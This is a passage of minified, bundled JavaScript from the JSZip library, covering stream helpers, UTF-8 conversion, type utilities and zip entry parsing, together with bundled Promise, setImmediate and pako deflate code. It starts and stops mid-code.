      var r = e("../utils"), a = e("./ConvertWorker"), i = e("./GenericWorker"), o = e("../base64"), s = e("../support"), l = e("../external"), u = null;
      if (s.nodestream) try {
        u = e("../nodejs/NodejsStreamOutputAdapter");
      } catch (e) {}
      function d(e, n, t) {
        var o = n;
        switch (n) {
          case "blob":
          case "arraybuffer":
            o = "uint8array";
            break;
          case "base64":
            o = "string";
        }
        try {
          this._internalType = o, this._outputType = n, this._mimeType = t, r.checkSupport(o), this._worker = e.pipe(new a(o)), e.lock();
        } catch (e) {
          this._worker = new i("error"), this._worker.error(e);
        }
      }
      d.prototype = {accumulate: function (e) {
        return function c(e, n) {
          return new l.Promise(function (t, a) {
            var i = [], s = e._internalType, l = e._outputType, u = e._mimeType;
            e.on("data", function (e, t) {
              i.push(e), n && n(t);
            }).on("error", function (e) {
              i = [], a(e);
            }).on("end", function () {
              try {
                var e = function (e, n, t) {
                  switch (e) {
                    case "blob":
                      return r.newBlob(r.transformTo("arraybuffer", n), t);
                    case "base64":
                      return o.encode(n);
                    default:
                      return r.transformTo(e, n);
                  }
                }(l, function (e, n) {
                  var t, r = 0, a = null, i = 0;
                  for (t = 0; t < n.length; t++) i += n[t].length;
                  switch (e) {
                    case "string":
                      return n.join("");
                    case "array":
                      return Array.prototype.concat.apply([], n);
                    case "uint8array":
                      for (a = new Uint8Array(i), t = 0; t < n.length; t++) a.set(n[t], r), r += n[t].length;
                      return a;
                    case "nodebuffer":
                      return Buffer.concat(n);
                    default:
                      throw new Error("concat : unsupported type '" + e + "'");
                  }
                }(s, i), u);
                t(e);
              } catch (e) {
                a(e);
              }
              i = [];
            }).resume();
          });
        }(this, e);
      }, on: function (e, n) {
        var t = this;
        return "data" === e ? this._worker.on(e, function (e) {
          n.call(t, e.data, e.meta);
        }) : this._worker.on(e, function () {
          r.delay(n, arguments, t);
        }), this;
      }, resume: function () {
        return r.delay(this._worker.resume, [], this._worker), this;
      }, pause: function () {
        return this._worker.pause(), this;
      }, toNodejsStream: function (e) {
        if (r.checkSupport("nodestream"), "nodebuffer" !== this._outputType) throw new Error(this._outputType + " is not supported by this method");
        return new u(this, {objectMode: "nodebuffer" !== this._outputType}, e);
      }}, n.exports = d;
    }, {"../base64": 1, "../external": 6, "../nodejs/NodejsStreamOutputAdapter": 13, "../support": 30, "../utils": 32, "./ConvertWorker": 24, "./GenericWorker": 28}], 30: [function (e, n, t) {
      "use strict";
      if (t.base64 = true, t.array = true, t.string = true, t.arraybuffer = "undefined" != typeof ArrayBuffer && "undefined" != typeof Uint8Array, t.nodebuffer = "undefined" != typeof Buffer, t.uint8array = "undefined" != typeof Uint8Array, "undefined" == typeof ArrayBuffer) t.blob = false; else {
        var r = new ArrayBuffer(0);
        try {
          t.blob = 0 === new Blob([r], {type: "application/zip"}).size;
        } catch (e) {
          try {
            var a = new (self.BlobBuilder || self.WebKitBlobBuilder || self.MozBlobBuilder || self.MSBlobBuilder);
            a.append(r), t.blob = 0 === a.getBlob("application/zip").size;
          } catch (e) {
            t.blob = false;
          }
        }
      }
      try {
        t.nodestream = !!e("readable-stream").Readable;
      } catch (e) {
        t.nodestream = false;
      }
    }, {"readable-stream": 16}], 31: [function (e, n, t) {
      "use strict";
      for (var r = e("./utils"), a = e("./support"), i = e("./nodejsUtils"), o = e("./stream/GenericWorker"), s = new Array(256), l = 0; l < 256; l++) s[l] = 252 <= l ? 6 : 248 <= l ? 5 : 240 <= l ? 4 : 224 <= l ? 3 : 192 <= l ? 2 : 1;
      function u() {
        o.call(this, "utf-8 decode"), this.leftOver = null;
      }
      function c() {
        o.call(this, "utf-8 encode");
      }
      s[254] = s[254] = 1, t.utf8encode = function (e) {
        return a.nodebuffer ? i.newBufferFrom(e, "utf-8") : function (e) {
          var n, t, r, i, o, s = e.length, l = 0;
          for (i = 0; i < s; i++) 55296 == (64512 & (t = e.charCodeAt(i))) && i + 1 < s && 56320 == (64512 & (r = e.charCodeAt(i + 1))) && (t = 65536 + (t - 55296 << 10) + (r - 56320), i++), l += t < 128 ? 1 : t < 2048 ? 2 : t < 65536 ? 3 : 4;
          for (n = a.uint8array ? new Uint8Array(l) : new Array(l), i = o = 0; o < l; i++) 55296 == (64512 & (t = e.charCodeAt(i))) && i + 1 < s && 56320 == (64512 & (r = e.charCodeAt(i + 1))) && (t = 65536 + (t - 55296 << 10) + (r - 56320), i++), t < 128 ? n[o++] = t : (t < 2048 ? n[o++] = 192 | t >>> 6 : (t < 65536 ? n[o++] = 224 | t >>> 12 : (n[o++] = 240 | t >>> 18, n[o++] = 128 | t >>> 12 & 63), n[o++] = 128 | t >>> 6 & 63), n[o++] = 128 | 63 & t);
          return n;
        }(e);
      }, t.utf8decode = function (e) {
        return a.nodebuffer ? r.transformTo("nodebuffer", e).toString("utf-8") : function (e) {
          var n, t, a, i, o = e.length, l = new Array(2 * o);
          for (n = t = 0; n < o;) if ((a = e[n++]) < 128) l[t++] = a; else if (4 < (i = s[a])) l[t++] = 65533, n += i - 1; else {
            for (a &= 2 === i ? 31 : 3 === i ? 15 : 7; 1 < i && n < o;) a = a << 6 | 63 & e[n++], i--;
            1 < i ? l[t++] = 65533 : a < 65536 ? l[t++] = a : (a -= 65536, l[t++] = 55296 | a >> 10 & 1023, l[t++] = 56320 | 1023 & a);
          }
          return l.length !== t && (l.subarray ? l = l.subarray(0, t) : l.length = t), r.applyFromCharCode(l);
        }(e = r.transformTo(a.uint8array ? "uint8array" : "array", e));
      }, r.inherits(u, o), u.prototype.processChunk = function (e) {
        var n = r.transformTo(a.uint8array ? "uint8array" : "array", e.data);
        if (this.leftOver && this.leftOver.length) {
          if (a.uint8array) {
            var i = n;
            (n = new Uint8Array(i.length + this.leftOver.length)).set(this.leftOver, 0), n.set(i, this.leftOver.length);
          } else n = this.leftOver.concat(n);
          this.leftOver = null;
        }
        var o = function (e, n) {
          var t;
          for ((n = n || e.length) > e.length && (n = e.length), t = n - 1; 0 <= t && 128 == (192 & e[t]);) t--;
          return t < 0 || 0 === t ? n : t + s[e[t]] > n ? t : n;
        }(n), l = n;
        o !== n.length && (a.uint8array ? (l = n.subarray(0, o), this.leftOver = n.subarray(o, n.length)) : (l = n.slice(0, o), this.leftOver = n.slice(o, n.length))), this.push({data: t.utf8decode(l), meta: e.meta});
      }, u.prototype.flush = function () {
        this.leftOver && this.leftOver.length && (this.push({data: t.utf8decode(this.leftOver), meta: {}}), this.leftOver = null);
      }, t.Utf8DecodeWorker = u, r.inherits(c, o), c.prototype.processChunk = function (e) {
        this.push({data: t.utf8encode(e.data), meta: e.meta});
      }, t.Utf8EncodeWorker = c;
    }, {"./nodejsUtils": 14, "./stream/GenericWorker": 28, "./support": 30, "./utils": 32}], 32: [function (e, n, t) {
      "use strict";
      var r = e("./support"), a = e("./base64"), i = e("./nodejsUtils"), o = e("./external");
      function l(e, n) {
        for (var t = 0; t < e.length; ++t) n[t] = 255 & e.charCodeAt(t);
        return n;
      }
      e("setimmediate"), t.newBlob = function (e, n) {
        t.checkSupport("blob");
        try {
          return new Blob([e], {type: n});
        } catch (t) {
          try {
            var r = new (self.BlobBuilder || self.WebKitBlobBuilder || self.MozBlobBuilder || self.MSBlobBuilder);
            return r.append(e), r.getBlob(n);
          } catch (e) {
            throw new Error("Bug : can't construct the Blob.");
          }
        }
      };
      var u = {stringifyByChunk: function (e, n, t) {
        var r = [], a = 0, i = e.length;
        if (i <= t) return String.fromCharCode.apply(null, e);
        for (; a < i;) "array" === n || "nodebuffer" === n ? r.push(String.fromCharCode.apply(null, e.slice(a, Math.min(a + t, i)))) : r.push(String.fromCharCode.apply(null, e.subarray(a, Math.min(a + t, i)))), a += t;
        return r.join("");
      }, stringifyByChar: function (e) {
        for (var n = "", t = 0; t < e.length; t++) n += String.fromCharCode(e[t]);
        return n;
      }, applyCanBeUsed: {uint8array: function () {
        try {
          return r.uint8array && 1 === String.fromCharCode.apply(null, new Uint8Array(1)).length;
        } catch (e) {
          return false;
        }
      }(), nodebuffer: function () {
        try {
          return r.nodebuffer && 1 === String.fromCharCode.apply(null, i.allocBuffer(1)).length;
        } catch (e) {
          return false;
        }
      }()}};
      function c(e) {
        var n = 65536, r = t.getTypeOf(e), a = true;
        if ("uint8array" === r ? a = u.applyCanBeUsed.uint8array : "nodebuffer" === r && (a = u.applyCanBeUsed.nodebuffer), a) for (; 1 < n;) try {
          return u.stringifyByChunk(e, r, n);
        } catch (e) {
          n = Math.floor(n / 2);
        }
        return u.stringifyByChar(e);
      }
      function d(e, n) {
        for (var t = 0; t < e.length; t++) n[t] = e[t];
        return n;
      }
      t.applyFromCharCode = c;
      var f = {};
      f.string = {string: s, array: function (e) {
        return l(e, new Array(e.length));
      }, arraybuffer: function (e) {
        return f.string.uint8array(e).buffer;
      }, uint8array: function (e) {
        return l(e, new Uint8Array(e.length));
      }, nodebuffer: function (e) {
        return l(e, i.allocBuffer(e.length));
      }}, f.array = {string: c, array: s, arraybuffer: function (e) {
        return new Uint8Array(e).buffer;
      }, uint8array: function (e) {
        return new Uint8Array(e);
      }, nodebuffer: function (e) {
        return i.newBufferFrom(e);
      }}, f.arraybuffer = {string: function (e) {
        return c(new Uint8Array(e));
      }, array: function (e) {
        return d(new Uint8Array(e), new Array(e.byteLength));
      }, arraybuffer: s, uint8array: function (e) {
        return new Uint8Array(e);
      }, nodebuffer: function (e) {
        return i.newBufferFrom(new Uint8Array(e));
      }}, f.uint8array = {string: c, array: function (e) {
        return d(e, new Array(e.length));
      }, arraybuffer: function (e) {
        return e.buffer;
      }, uint8array: s, nodebuffer: function (e) {
        return i.newBufferFrom(e);
      }}, f.nodebuffer = {string: c, array: function (e) {
        return d(e, new Array(e.length));
      }, arraybuffer: function (e) {
        return f.nodebuffer.uint8array(e).buffer;
      }, uint8array: function (e) {
        return d(e, new Uint8Array(e.length));
      }, nodebuffer: s}, t.transformTo = function (e, n) {
        if (n = n || "", !e) return n;
        t.checkSupport(e);
        var r = t.getTypeOf(n);
        return f[r][e](n);
      }, t.resolve = function (e) {
        for (var n = e.split("/"), t = [], r = 0; r < n.length; r++) {
          var a = n[r];
          "." === a || "" === a && 0 !== r && r !== n.length - 1 || (".." === a ? t.pop() : t.push(a));
        }
        return t.join("/");
      }, t.getTypeOf = function (e) {
        return "string" == typeof e ? "string" : "[object Array]" === Object.prototype.toString.call(e) ? "array" : r.nodebuffer && i.isBuffer(e) ? "nodebuffer" : r.uint8array && e instanceof Uint8Array ? "uint8array" : r.arraybuffer && e instanceof ArrayBuffer ? "arraybuffer" : undefined;
      }, t.checkSupport = function (e) {
        if (!r[e.toLowerCase()]) throw new Error(e + " is not supported by this platform");
      }, t.MAX_VALUE_16BITS = 65535, t.MAX_VALUE_32BITS = -1, t.pretty = function (e) {
        var n, t, r = "";
        for (t = 0; t < (e || "").length; t++) r += "\\x" + ((n = e.charCodeAt(t)) < 16 ? "0" : "") + n.toString(16).toUpperCase();
        return r;
      }, t.delay = function (e, n, t) {
        setImmediate(function () {
          e.apply(t || null, n || []);
        });
      }, t.inherits = function (e, n) {
        function t() {}
        t.prototype = n.prototype, e.prototype = new t;
      }, t.extend = function () {
        var e, n, t = {};
        for (e = 0; e < arguments.length; e++) for (n in arguments[e]) Object.prototype.hasOwnProperty.call(arguments[e], n) && undefined === t[n] && (t[n] = arguments[e][n]);
        return t;
      }, t.prepareContent = function (e, n, i, s, u) {
        return o.Promise.resolve(n).then(function (e) {
          return r.blob && (e instanceof Blob || -1 !== ["[object File]", "[object Blob]"].indexOf(Object.prototype.toString.call(e))) && "undefined" != typeof FileReader ? new o.Promise(function (n, t) {
            var r = new FileReader;
            r.onload = function (e) {
              n(e.target.result);
            }, r.onerror = function (e) {
              t(e.target.error);
            }, r.readAsArrayBuffer(e);
          }) : e;
        }).then(function (n) {
          var c = t.getTypeOf(n);
          return c ? ("arraybuffer" === c ? n = t.transformTo("uint8array", n) : "string" === c && (u ? n = a.decode(n) : i && true !== s && (n = function (e) {
            return l(e, r.uint8array ? new Uint8Array(e.length) : new Array(e.length));
          }(n))), n) : o.Promise.reject(new Error("Can't read the data of '" + e + "'. Is it in a supported JavaScript type (String, Blob, ArrayBuffer, etc) ?"));
        });
      };
    }, {"./base64": 1, "./external": 6, "./nodejsUtils": 14, "./support": 30, setimmediate: 54}], 33: [function (e, n, t) {
      "use strict";
      var r = e("./reader/readerFor"), a = e("./utils"), i = e("./signature"), o = e("./zipEntry"), s = e("./support");
      function l(e) {
        this.files = [], this.loadOptions = e;
      }
      l.prototype = {checkSignature: function (e) {
        if (!this.reader.readAndCheckSignature(e)) {
          this.reader.index -= 4;
          var n = this.reader.readString(4);
          throw new Error("Corrupted zip or bug: unexpected signature (" + a.pretty(n) + ", expected " + a.pretty(e) + ")");
        }
      }, isSignature: function (e, n) {
        var t = this.reader.index;
        this.reader.setIndex(e);
        var r = this.reader.readString(4) === n;
        return this.reader.setIndex(t), r;
      }, readBlockEndOfCentral: function () {
        this.diskNumber = this.reader.readInt(2), this.diskWithCentralDirStart = this.reader.readInt(2), this.centralDirRecordsOnThisDisk = this.reader.readInt(2), this.centralDirRecords = this.reader.readInt(2), this.centralDirSize = this.reader.readInt(4), this.centralDirOffset = this.reader.readInt(4), this.zipCommentLength = this.reader.readInt(2);
        var e = this.reader.readData(this.zipCommentLength), n = s.uint8array ? "uint8array" : "array", t = a.transformTo(n, e);
        this.zipComment = this.loadOptions.decodeFileName(t);
      }, readBlockZip64EndOfCentral: function () {
        this.zip64EndOfCentralSize = this.reader.readInt(8), this.reader.skip(4), this.diskNumber = this.reader.readInt(4), this.diskWithCentralDirStart = this.reader.readInt(4), this.centralDirRecordsOnThisDisk = this.reader.readInt(8), this.centralDirRecords = this.reader.readInt(8), this.centralDirSize = this.reader.readInt(8), this.centralDirOffset = this.reader.readInt(8), this.zip64ExtensibleData = {};
        for (var e, n, t, r = this.zip64EndOfCentralSize - 44; 0 < r;) e = this.reader.readInt(2), n = this.reader.readInt(4), t = this.reader.readData(n), this.zip64ExtensibleData[e] = {id: e, length: n, value: t};
      }, readBlockZip64EndOfCentralLocator: function () {
        if (this.diskWithZip64CentralDirStart = this.reader.readInt(4), this.relativeOffsetEndOfZip64CentralDir = this.reader.readInt(8), this.disksCount = this.reader.readInt(4), 1 < this.disksCount) throw new Error("Multi-volumes zip are not supported");
      }, readLocalFiles: function () {
        var e, n;
        for (e = 0; e < this.files.length; e++) n = this.files[e], this.reader.setIndex(n.localHeaderOffset), this.checkSignature(i.LOCAL_FILE_HEADER), n.readLocalPart(this.reader), n.handleUTF8(), n.processAttributes();
      }, readCentralDir: function () {
        var e;
        for (this.reader.setIndex(this.centralDirOffset); this.reader.readAndCheckSignature(i.CENTRAL_FILE_HEADER);) (e = new o({zip64: this.zip64}, this.loadOptions)).readCentralPart(this.reader), this.files.push(e);
        if (this.centralDirRecords !== this.files.length && 0 !== this.centralDirRecords && 0 === this.files.length) throw new Error("Corrupted zip or bug: expected " + this.centralDirRecords + " records in central dir, got " + this.files.length);
      }, readEndOfCentral: function () {
        var e = this.reader.lastIndexOfSignature(i.CENTRAL_DIRECTORY_END);
        if (e < 0) throw this.isSignature(0, i.LOCAL_FILE_HEADER) ? new Error("Corrupted zip: can't find end of central directory") : new Error("Can't find end of central directory : is this a zip file ? If it is, see https://stuk.github.io/jszip/documentation/howto/read_zip.html");
        this.reader.setIndex(e);
        var n = e;
        if (this.checkSignature(i.CENTRAL_DIRECTORY_END), this.readBlockEndOfCentral(), this.diskNumber === a.MAX_VALUE_16BITS || this.diskWithCentralDirStart === a.MAX_VALUE_16BITS || this.centralDirRecordsOnThisDisk === a.MAX_VALUE_16BITS || this.centralDirRecords === a.MAX_VALUE_16BITS || this.centralDirSize === a.MAX_VALUE_32BITS || this.centralDirOffset === a.MAX_VALUE_32BITS) {
          if (this.zip64 = true, (e = this.reader.lastIndexOfSignature(i.ZIP64_CENTRAL_DIRECTORY_LOCATOR)) < 0) throw new Error("Corrupted zip: can't find the ZIP64 end of central directory locator");
          if (this.reader.setIndex(e), this.checkSignature(i.ZIP64_CENTRAL_DIRECTORY_LOCATOR), this.readBlockZip64EndOfCentralLocator(), !this.isSignature(this.relativeOffsetEndOfZip64CentralDir, i.ZIP64_CENTRAL_DIRECTORY_END) && (this.relativeOffsetEndOfZip64CentralDir = this.reader.lastIndexOfSignature(i.ZIP64_CENTRAL_DIRECTORY_END), this.relativeOffsetEndOfZip64CentralDir < 0)) throw new Error("Corrupted zip: can't find the ZIP64 end of central directory");
          this.reader.setIndex(this.relativeOffsetEndOfZip64CentralDir), this.checkSignature(i.ZIP64_CENTRAL_DIRECTORY_END), this.readBlockZip64EndOfCentral();
        }
        var t = this.centralDirOffset + this.centralDirSize;
        this.zip64 && (t += 20, t += 12 + this.zip64EndOfCentralSize);
        var r = n - t;
        if (0 < r) this.isSignature(n, i.CENTRAL_FILE_HEADER) || (this.reader.zero = r); else if (r < 0) throw new Error("Corrupted zip: missing " + Math.abs(r) + " bytes.");
      }, prepareReader: function (e) {
        this.reader = r(e);
      }, load: function (e) {
        this.prepareReader(e), this.readEndOfCentral(), this.readCentralDir(), this.readLocalFiles();
      }}, n.exports = l;
    }, {"./reader/readerFor": 22, "./signature": 23, "./support": 30, "./utils": 32, "./zipEntry": 34}], 34: [function (e, n, t) {
      "use strict";
      var r = e("./reader/readerFor"), a = e("./utils"), i = e("./compressedObject"), o = e("./crc32"), s = e("./utf8"), l = e("./compressions"), u = e("./support");
      function c(e, n) {
        this.options = e, this.loadOptions = n;
      }
      c.prototype = {isEncrypted: function () {
        return !(1 & ~this.bitFlag);
      }, useUTF8: function () {
        return !(2048 & ~this.bitFlag);
      }, readLocalPart: function (e) {
        var n, t;
        if (e.skip(22), this.fileNameLength = e.readInt(2), t = e.readInt(2), this.fileName = e.readData(this.fileNameLength), e.skip(t), -1 === this.compressedSize || -1 === this.uncompressedSize) throw new Error("Bug or corrupted zip : didn't get enough information from the central directory (compressedSize === -1 || uncompressedSize === -1)");
        if (null === (n = function (e) {
          for (var n in l) if (Object.prototype.hasOwnProperty.call(l, n) && l[n].magic === e) return l[n];
          return null;
        }(this.compressionMethod))) throw new Error("Corrupted zip : compression " + a.pretty(this.compressionMethod) + " unknown (inner file : " + a.transformTo("string", this.fileName) + ")");
        this.decompressed = new i(this.compressedSize, this.uncompressedSize, this.crc32, n, e.readData(this.compressedSize));
      }, readCentralPart: function (e) {
        this.versionMadeBy = e.readInt(2), e.skip(2), this.bitFlag = e.readInt(2), this.compressionMethod = e.readString(2), this.date = e.readDate(), this.crc32 = e.readInt(4), this.compressedSize = e.readInt(4), this.uncompressedSize = e.readInt(4);
        var n = e.readInt(2);
        if (this.extraFieldsLength = e.readInt(2), this.fileCommentLength = e.readInt(2), this.diskNumberStart = e.readInt(2), this.internalFileAttributes = e.readInt(2), this.externalFileAttributes = e.readInt(4), this.localHeaderOffset = e.readInt(4), this.isEncrypted()) throw new Error("Encrypted zip are not supported");
        e.skip(n), this.readExtraFields(e), this.parseZIP64ExtraField(e), this.fileComment = e.readData(this.fileCommentLength);
      }, processAttributes: function () {
        this.unixPermissions = null, this.dosPermissions = null;
        var e = this.versionMadeBy >> 8;
        this.dir = !!(16 & this.externalFileAttributes), 0 == e && (this.dosPermissions = 63 & this.externalFileAttributes), 3 == e && (this.unixPermissions = this.externalFileAttributes >> 16 & 65535), this.dir || "/" !== this.fileNameStr.slice(-1) || (this.dir = true);
      }, parseZIP64ExtraField: function () {
        if (this.extraFields[1]) {
          var e = r(this.extraFields[1].value);
          this.uncompressedSize === a.MAX_VALUE_32BITS && (this.uncompressedSize = e.readInt(8)), this.compressedSize === a.MAX_VALUE_32BITS && (this.compressedSize = e.readInt(8)), this.localHeaderOffset === a.MAX_VALUE_32BITS && (this.localHeaderOffset = e.readInt(8)), this.diskNumberStart === a.MAX_VALUE_32BITS && (this.diskNumberStart = e.readInt(4));
        }
      }, readExtraFields: function (e) {
        var n, t, r, a = e.index + this.extraFieldsLength;
        for (this.extraFields || (this.extraFields = {}); e.index + 4 < a;) n = e.readInt(2), t = e.readInt(2), r = e.readData(t), this.extraFields[n] = {id: n, length: t, value: r};
        e.setIndex(a);
      }, handleUTF8: function () {
        var e = u.uint8array ? "uint8array" : "array";
        if (this.useUTF8()) this.fileNameStr = s.utf8decode(this.fileName), this.fileCommentStr = s.utf8decode(this.fileComment); else {
          var n = this.findExtraFieldUnicodePath();
          if (null !== n) this.fileNameStr = n; else {
            var t = a.transformTo(e, this.fileName);
            this.fileNameStr = this.loadOptions.decodeFileName(t);
          }
          var r = this.findExtraFieldUnicodeComment();
          if (null !== r) this.fileCommentStr = r; else {
            var i = a.transformTo(e, this.fileComment);
            this.fileCommentStr = this.loadOptions.decodeFileName(i);
          }
        }
      }, findExtraFieldUnicodePath: function () {
        var e = this.extraFields[28789];
        if (e) {
          var n = r(e.value);
          return 1 !== n.readInt(1) || o(this.fileName) !== n.readInt(4) ? null : s.utf8decode(n.readData(e.length - 5));
        }
        return null;
      }, findExtraFieldUnicodeComment: function () {
        var e = this.extraFields[25461];
        if (e) {
          var n = r(e.value);
          return 1 !== n.readInt(1) || o(this.fileComment) !== n.readInt(4) ? null : s.utf8decode(n.readData(e.length - 5));
        }
        return null;
      }}, n.exports = c;
    }, {"./compressedObject": 2, "./compressions": 3, "./crc32": 4, "./reader/readerFor": 22, "./support": 30, "./utf8": 31, "./utils": 32}], 35: [function (e, n, t) {
      "use strict";
      function r(e, n, t) {
        this.name = e, this.dir = t.dir, this.date = t.date, this.comment = t.comment, this.unixPermissions = t.unixPermissions, this.dosPermissions = t.dosPermissions, this._data = n, this._dataBinary = t.binary, this.options = {compression: t.compression, compressionOptions: t.compressionOptions};
      }
      var a = e("./stream/StreamHelper"), i = e("./stream/DataWorker"), o = e("./utf8"), s = e("./compressedObject"), l = e("./stream/GenericWorker");
      r.prototype = {internalStream: function (e) {
        var n = null, t = "string";
        try {
          if (!e) throw new Error("No output type specified.");
          var r = "string" === (t = e.toLowerCase()) || "text" === t;
          "binarystring" !== t && "text" !== t || (t = "string"), n = this._decompressWorker();
          var i = !this._dataBinary;
          i && !r && (n = n.pipe(new o.Utf8EncodeWorker)), !i && r && (n = n.pipe(new o.Utf8DecodeWorker));
        } catch (e) {
          (n = new l("error")).error(e);
        }
        return new a(n, t, "");
      }, async: function (e, n) {
        return this.internalStream(e).accumulate(n);
      }, nodeStream: function (e, n) {
        return this.internalStream(e || "nodebuffer").toNodejsStream(n);
      }, _compressWorker: function (e, n) {
        if (this._data instanceof s && this._data.compression.magic === e.magic) return this._data.getCompressedWorker();
        var t = this._decompressWorker();
        return this._dataBinary || (t = t.pipe(new o.Utf8EncodeWorker)), s.createWorkerFrom(t, e, n);
      }, _decompressWorker: function () {
        return this._data instanceof s ? this._data.getContentWorker() : this._data instanceof l ? this._data : new i(this._data);
      }};
      for (var u = ["asText", "asBinary", "asNodeBuffer", "asUint8Array", "asArrayBuffer"], c = function () {
        throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.");
      }, d = 0; d < u.length; d++) r.prototype[u[d]] = c;
      n.exports = r;
    }, {"./compressedObject": 2, "./stream/DataWorker": 27, "./stream/GenericWorker": 28, "./stream/StreamHelper": 29, "./utf8": 31}], 36: [function (e, n, r) {
      (function (e) {
        "use strict";
        var t, r, a = e.MutationObserver || e.WebKitMutationObserver;
        if (a) {
          var i = 0, o = new a(c), s = e.document.createTextNode("");
          o.observe(s, {characterData: true}), t = function () {
            s.data = i = ++i % 2;
          };
        } else if (e.setImmediate || undefined === e.MessageChannel) t = "document" in e && "onreadystatechange" in e.document.createElement("script") ? function () {
          var n = e.document.createElement("script");
          n.onreadystatechange = function () {
            c(), n.onreadystatechange = null, n.parentNode.removeChild(n), n = null;
          }, e.document.documentElement.appendChild(n);
        } : function () {
          setTimeout(c, 0);
        }; else {
          var l = new e.MessageChannel;
          l.port1.onmessage = c, t = function () {
            l.port2.postMessage(0);
          };
        }
        var u = [];
        function c() {
          var e, n;
          r = true;
          for (var t = u.length; t;) {
            for (n = u, u = [], e = -1; ++e < t;) n[e]();
            t = u.length;
          }
          r = false;
        }
        n.exports = function (e) {
          1 !== u.push(e) || r || t();
        };
      }.call(this, undefined !== t.g ? t.g : "undefined" != typeof self ? self : "undefined" != typeof window ? window : {}));
    }, {}], 37: [function (e, n, t) {
      "use strict";
      var r = e("immediate");
      function a() {}
      var i = {}, o = ["REJECTED"], s = ["FULFILLED"], l = ["PENDING"];
      function u(e) {
        if ("function" != typeof e) throw new TypeError("resolver must be a function");
        this.state = l, this.queue = [], this.outcome = undefined, e !== a && m(this, e);
      }
      function c(e, n, t) {
        this.promise = e, "function" == typeof n && (this.onFulfilled = n, this.callFulfilled = this.otherCallFulfilled), "function" == typeof t && (this.onRejected = t, this.callRejected = this.otherCallRejected);
      }
      function d(e, n, t) {
        r(function () {
          var r;
          try {
            r = n(t);
          } catch (r) {
            return i.reject(e, r);
          }
          r === e ? i.reject(e, new TypeError("Cannot resolve promise with itself")) : i.resolve(e, r);
        });
      }
      function f(e) {
        var n = e && e.then;
        if (e && ("object" == typeof e || "function" == typeof e) && "function" == typeof n) return function () {
          n.apply(e, arguments);
        };
      }
      function m(e, n) {
        var t = false;
        function r(n) {
          t || (t = true, i.reject(e, n));
        }
        function a(n) {
          t || (t = true, i.resolve(e, n));
        }
        var o = h(function () {
          n(a, r);
        });
        "error" === o.status && r(o.value);
      }
      function h(e, n) {
        var t = {};
        try {
          t.value = e(n), t.status = "success";
        } catch (e) {
          t.status = "error", t.value = e;
        }
        return t;
      }
      (n.exports = u).prototype.finally = function (e) {
        if ("function" != typeof e) return this;
        var n = this.constructor;
        return this.then(function (t) {
          return n.resolve(e()).then(function () {
            return t;
          });
        }, function (t) {
          return n.resolve(e()).then(function () {
            throw t;
          });
        });
      }, u.prototype.catch = function (e) {
        return this.then(null, e);
      }, u.prototype.then = function (e, n) {
        if ("function" != typeof e && this.state === s || "function" != typeof n && this.state === o) return this;
        var t = new this.constructor(a);
        return this.state !== l ? d(t, this.state === s ? e : n, this.outcome) : this.queue.push(new c(t, e, n)), t;
      }, c.prototype.callFulfilled = function (e) {
        i.resolve(this.promise, e);
      }, c.prototype.otherCallFulfilled = function (e) {
        d(this.promise, this.onFulfilled, e);
      }, c.prototype.callRejected = function (e) {
        i.reject(this.promise, e);
      }, c.prototype.otherCallRejected = function (e) {
        d(this.promise, this.onRejected, e);
      }, i.resolve = function (e, n) {
        var t = h(f, n);
        if ("error" === t.status) return i.reject(e, t.value);
        var r = t.value;
        if (r) m(e, r); else {
          e.state = s, e.outcome = n;
          for (var a = -1, o = e.queue.length; ++a < o;) e.queue[a].callFulfilled(n);
        }
        return e;
      }, i.reject = function (e, n) {
        e.state = o, e.outcome = n;
        for (var t = -1, r = e.queue.length; ++t < r;) e.queue[t].callRejected(n);
        return e;
      }, u.resolve = function (e) {
        return e instanceof this ? e : i.resolve(new this(a), e);
      }, u.reject = function (e) {
        var n = new this(a);
        return i.reject(n, e);
      }, u.all = function (e) {
        var n = this;
        if ("[object Array]" !== Object.prototype.toString.call(e)) return this.reject(new TypeError("must be an array"));
        var t = e.length, r = false;
        if (!t) return this.resolve([]);
        for (var o = new Array(t), s = 0, l = -1, u = new this(a); ++l < t;) c(e[l], l);
        return u;
        function c(e, a) {
          n.resolve(e).then(function (e) {
            o[a] = e, ++s !== t || r || (r = true, i.resolve(u, o));
          }, function (e) {
            r || (r = true, i.reject(u, e));
          });
        }
      }, u.race = function (e) {
        if ("[object Array]" !== Object.prototype.toString.call(e)) return this.reject(new TypeError("must be an array"));
        var t = e.length, r = false;
        if (!t) return this.resolve([]);
        for (var o, s = -1, l = new this(a); ++s < t;) o = e[s], this.resolve(o).then(function (e) {
          r || (r = true, i.resolve(l, e));
        }, function (e) {
          r || (r = true, i.reject(l, e));
        });
        return l;
      };
    }, {immediate: 36}], 38: [function (e, n, t) {
      "use strict";
      var r = {};
      (0, e("./lib/utils/common").assign)(r, e("./lib/deflate"), e("./lib/inflate"), e("./lib/zlib/constants")), n.exports = r;
    }, {"./lib/deflate": 39, "./lib/inflate": 40, "./lib/utils/common": 41, "./lib/zlib/constants": 44}], 39: [function (e, n, t) {
      "use strict";
      var r = e("./zlib/deflate"), a = e("./utils/common"), i = e("./utils/strings"), o = e("./zlib/messages"), s = e("./zlib/zstream"), l = Object.prototype.toString, u = 0, c = -1, d = 0, f = 8;
      function m(e) {
        if (!(this instanceof m)) return new m(e);
        this.options = a.assign({level: c, method: f, chunkSize: 16384, windowBits: 15, memLevel: 8, strategy: d, to: ""}, e || {});
        var n = this.options;
        n.raw && 0 < n.windowBits ? n.windowBits = -n.windowBits : n.gzip && 0 < n.windowBits && n.windowBits < 16 && (n.windowBits += 16), this.err = 0, this.msg = "", this.ended = false, this.chunks = [], this.strm = new s, this.strm.avail_out = 0;
        var t = r.deflateInit2(this.strm, n.level, n.method, n.windowBits, n.memLevel, n.strategy);
        if (t !== u) throw new Error(o[t]);
        if (n.header && r.deflateSetHeader(this.strm, n.header), n.dictionary) {
          var h;
          if (h = "string" == typeof n.dictionary ? i.string2buf(n.dictionary) : "[object ArrayBuffer]" === l.call(n.dictionary) ? new Uint8Array(n.dictionary) : n.dictionary, (t = r.deflateSetDictionary(this.strm, h)) !== u) throw new Error(o[t]);
          this._dict_set = true;
        }
      }
      function h(e, n) {
        var t = new m(n);
        if (t.push(e, true), t.err) throw t.msg || o[t.err];
        return t.result;
      }
      m.prototype.push = function (e, n) {
        var t, o, s = this.strm, c = this.options.chunkSize;
        if (this.ended) return false;
